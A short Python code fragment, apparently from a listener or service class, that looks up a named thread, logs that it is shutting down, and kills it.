        to_kill = name if name and name != "" else self.options["Name"]["Value"]
        self.instance_log.info(f"{to_kill}: shutting down...")
        log.info(f"{to_kill}: shutting down...")
        self.threads[to_kill].kill()
